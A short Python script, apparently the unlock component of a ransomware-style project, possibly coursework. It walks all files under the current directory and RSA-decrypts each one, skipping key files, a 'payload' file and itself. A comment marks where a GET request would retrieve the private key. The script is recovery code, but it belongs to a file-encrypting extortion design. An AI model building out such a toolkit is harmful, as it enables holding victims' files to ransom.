import os
from src import MyDecrypt, constants

#Insert GET request to retrieve the private key for the public key stored on the disk


# Set the private key filepath
RSAPrivateKeyFilePath = constants.PRIVATE_KEY_FILE_PATH

# Gather all filenames, traversing subdirectories
for root, dirs, files in os.walk("."):
	# Loop for each file
	for file in files:
		filePath = os.path.join(root, file)

		# Do not decrypt the private/public key or payload or MyUnlock
		if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or
                filePath.endswith(constants.PUBLIC_KEY_FILE_PATH) or
                filePath.endswith(constants.PAYLOAD_FILE_PATH) or
                filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):

			# Decrypt the encrypted message
			MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)